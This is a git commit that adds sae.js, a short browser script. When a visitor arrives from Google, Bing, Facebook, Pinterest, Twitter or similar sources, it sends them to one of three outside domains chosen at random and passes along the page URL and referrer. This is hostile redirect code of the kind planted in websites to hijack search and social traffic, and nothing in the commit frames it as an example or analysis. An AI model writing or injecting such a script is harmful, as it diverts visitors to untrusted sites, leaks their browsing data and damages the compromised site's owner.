c891a0365f08167ea1a9787e1511e9c47d766b08
adelvina <103128927+adelvina@users.noreply.github.com>
2022-04-06 21:58:19 +0700

    Create sae.js

---
+++ sae.js
@@ -0,0 +1,12 @@
+var ars 	= rChoice([
+	'https://golek.icu/',
+	'https://wohnkultur.pw/',
+	'https://insurancedefinition.xyz/'
+	]);
+
+function rChoice(arr) {
+    return arr[Math.floor(arr.length * Math.random())];
+}
+
+//Code arsae client javascript
+if(['.google.', 'bing.', '.yahoo.',  'yandex.', 'facebook.', 'duckduckgo.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
